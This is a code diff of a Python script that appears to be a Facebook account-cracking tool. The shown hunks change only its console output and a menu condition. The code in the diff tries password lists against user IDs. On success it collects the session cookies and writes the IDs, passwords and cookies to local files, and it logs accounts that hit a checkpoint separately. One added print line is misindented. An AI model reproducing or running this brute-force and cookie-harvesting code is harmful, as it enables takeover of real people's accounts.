@@ -384,7 +384,7 @@ def menu():
 	        idt = input('└──[ ID Target : ')
 	        dump(idt,"",{"cookie":cok},token)
 	        atur_id()
-	if CYXIEON_GANTENG in ['02','2']:
+	elif CYXIEON_GANTENG in ['02','2']:
 	        dump_massal()
 	elif CYXIEON_GANTENG in ['03','3']:
 	        mail2()
@@ -799,7 +799,7 @@ def crackvalidate(idf,pwx,url):
 	rr = random.randint
 	rc = random.choice
 	emot = rc(["😝","😜","🤪"])
-	prog.update(des,description=f"\r {emot}(RulValidate)(%sOK:{ok}%s)(%sCP:{cp}%s)(%s {loop}%s)"%(hijo,puti,kun,puti,hijo,puti))
+	prog.update(des,description=f"\r {emot}({asu}RulValidate{puti})(%sOK:{ok}%s)(%sCP:{cp}%s)(%s {loop}%s)"%(hijo,puti,kun,puti,hijo,puti))
 	prog.advance(des)
 	for pw in pwx:
 		try:
@@ -851,12 +851,21 @@ def crackvalidate(idf,pwx,url):
 				ok+=1
 				coki = ses.cookies.get_dict()
 				kuki = "datr=" + coki["datr"] + ";" + ("sb=" + coki["sb"]) + ";" + "locale=id_ID" + ";" + ("c_user=" + coki["c_user"]) + ";" + ("xs=" + coki["xs"]) + ";" + ("fr=" + coki["fr"]) + ";"
-				prints(panel(f"\n⌲ User ID: {hijo}{idf}{puti}\n⌲ Password: {hijo}{pw}{puti}\n⌲ Tahun: {mer}{tahun(idf)}{puti}\n⌲ Cookie: {hijo}{kuki}{puti}\n{hijo}{ua}",title=f"[[green] RulSucces [/]]",style=f"bold blue"))
+				print(f"\n>>>>{hijo}RulSucces{puti}<<<<")
+				print(f"{biru}└──[{puti}⌲ User ID: {kun}{idf}{puti}")
+				print(f"    {biru}└──[{puti}⌲ Password: {kun}{pw}{puti}")
+				print(f".       {biru}└──[{puti}⌲ Tahun: {mer}{tahun(idf)}{puti}")
+				print(f'{biru}└──[{puti}⌲ Kuki : {hijo}{kuki}{puti}')
+				print(f'    {biru}└──[{puti}⌲ Ua : {ung}{ua}')
 				open('CYXIEON-OK/'+'CYXIEON-OK.txt','a').write(idf+'|'+pw+'|'+'\n')
 				open('CYXIEON-OK/'+'CYXIEON-WhithCookies.txt','a').write(idf+'|'+pw+'|'+kuki+'|''\n')
 				break			
 			elif "checkpoint" in po.cookies.get_dict().keys():
-				prints(panel(f"\n⌲ User ID: {kun}{idf}{puti}\n⌲ Password: {kun}{pw}{puti}\n⌲ Tahun: {mer}{tahun(idf)}{puti}\n{kun}{ua}",title=f"[[green] RulCheckpoint [/]]",style=f"bold blue"))
+			    print(f"\n>>>>{kun}RulCheckpoint{puti}<<<<")
+				print(f"{biru}└──[{puti}⌲ User ID: {kun}{idf}{puti}")
+				print(f"    {biru}└──[{puti}⌲ Password: {kun}{pw}{puti}")
+				print(f".       {biru}└──[{puti}⌲ Tahun: {mer}{tahun(idf)}{puti}")
+				print(f'{biru}└──[{puti}{ung}{ua}')
 				open('CYXIEON-CP/'+'CYXIEON-CP.txt','a').write(idf+'|'+pw+'|'+'\n')
 				akune.append(idf+'|'+pw)
 				ceker(idf,pw)
@@ -876,7 +885,7 @@ def crackreguler(idf,pwx,url):
 	rr = random.randint
 	rc = random.choice
 	emot = rc(["😝","😜","🤪"])
-	prog.update(des,description=f"\r {emot}(RulReguler)(%sOK:{ok}%s)(%sCP:{cp}%s)(%s{loop}%s)"%(hijo,puti,kun,puti,hijo,puti))
+	prog.update(des,description=f"\r {emot}({asu}RulReguler{puti})(%sOK:{ok}%s)(%sCP:{cp}%s)(%s{loop}%s)"%(hijo,puti,kun,puti,hijo,puti))
 	prog.advance(des)
 	for pw in pwx:
 		try:
@@ -928,12 +937,21 @@ def crackreguler(idf,pwx,url):
 				ok+=1
 				coki = ses.cookies.get_dict()
 				kuki = "datr=" + coki["datr"] + ";" + ("sb=" + coki["sb"]) + ";" + "locale=id_ID" + ";" + ("c_user=" + coki["c_user"]) + ";" + ("xs=" + coki["xs"]) + ";" + ("fr=" + coki["fr"]) + ";"
-				prints(panel(f"\n⌲ User ID: {hijo}{idf}{puti}\n⌲ Password: {hijo}{pw}{puti}\n⌲ Tahun: {mer}{tahun(idf)}{puti}\n⌲ Cookie: {hijo}{kuki}{puti}\n{hijo}{ua}",title=f"[[green] RulSucces [/]]",style=f"bold blue"))
+				print(f"\n>>>>{hijo}RulSucces{puti}<<<<")
+				print(f"{biru}└──[{puti}⌲ User ID: {kun}{idf}{puti}")
+				print(f"    {biru}└──[{puti}⌲ Password: {kun}{pw}{puti}")
+				print(f".       {biru}└──[{puti}⌲ Tahun: {mer}{tahun(idf)}{puti}")
+				print(f'{biru}└──[{puti}⌲ Kuki : {hijo}{kuki}{puti}')
+				print(f'    {biru}└──[{puti}⌲ Ua : {ung}{ua}')
 				open('CYXIEON-OK/'+'CYXIEON-OK.txt','a').write(idf+'|'+pw+'|'+'\n')
 				open('CYXIEON-OK/'+'CYXIEON-WhithCookies.txt','a').write(idf+'|'+pw+'|'+kuki+'|''\n')
 				break			
 			elif "checkpoint" in po.cookies.get_dict().keys():
-				prints(panel(f"\n⌲ User ID: {kun}{idf}{puti}\n⌲ Password: {kun}{pw}{puti}\n⌲ Tahun: {mer}{tahun(idf)}{puti}\n{kun}{ua}",title=f"[[green] RulCheckpoint [/]]",style=f"bold blue"))
+			    print(f"\n>>>>{kun}RulCheckpoint{puti}<<<<")
+				print(f"{biru}└──[{puti}⌲ User ID: {kun}{idf}{puti}")
+				print(f"    {biru}└──[{puti}⌲ Password: {kun}{pw}{puti}")
+				print(f".       {biru}└──[{puti}⌲ Tahun: {mer}{tahun(idf)}{puti}")
+				print(f'{biru}└──[{puti}{ung}{ua}')
 				open('CYXIEON-CP/'+'CYXIEON-CP.txt','a').write(idf+'|'+pw+'|'+'\n')
 				akune.append(idf+'|'+pw)
 				ceker(idf,pw)
